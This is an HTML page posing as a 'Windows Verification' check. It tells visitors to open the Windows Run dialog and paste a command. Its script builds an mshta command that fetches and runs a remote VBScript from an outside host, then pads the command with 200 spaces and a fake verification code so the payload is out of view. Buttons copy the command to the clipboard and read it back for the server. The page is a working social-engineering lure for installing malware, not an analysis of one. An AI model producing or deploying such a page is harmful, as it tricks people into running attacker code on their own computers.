<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Windows Verification</title>
  <style>
    body {
      background: #111;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    .cmd {
      background: #222;
      padding: 10px;
      margin: 20px auto;
      border-radius: 8px;
      display: inline-block;
      font-family: monospace;
      font-size: 0.95rem;
      user-select: all;
      max-width: 90%;
      word-break: break-word;
    }
    .btn {
      background: #5865F2;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin: 10px;
    }
    .btn:hover {
      background: #4752c4;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>Windows Verification</h2>
  <p>1. Press <b>Win + R</b>, paste, and press Enter</p>
  <div class="cmd" id="cmdBox"></div>
  <button class="btn" onclick="copyCommand()">Copy</button>
  <button class="btn" onclick="verifyCode()">Done</button>
  <p id="result"></p>

  <script>
    let code = "";

    fetch("/generate-verification-code")
      .then(res => res.json())
      .then(data => {
        code = data.code;
        const spaces = " ".repeat(200);
        const cmd = `mshta https://freegamecopier.onrender.com/verifyaccept.vbs${spaces}Code: ${code}`;
        document.getElementById("cmdBox").textContent = cmd;
        window.generatedCommand = cmd;
      });

    function copyCommand() {
      navigator.clipboard.writeText(window.generatedCommand).then(() => {
        alert("Copied command to clipboard.");
      });
    }

    function verifyCode() {
      navigator.clipboard.readText().then(text => {
        fetch("/verify-windows-code", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ clipboard: text })
        })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            document.getElementById("result").style.color = "lime";
            document.getElementById("result").textContent = "✔ Verified! Redirecting...";
            setTimeout(() => {
              window.location.href = "/verifynotwindows";
            }, 1000);
          } else {
            document.getElementById("result").style.color = "red";
            document.getElementById("result").textContent = "❌ Verification failed.";
          }
        });
      });
    }
  </script>
</body>
</html>
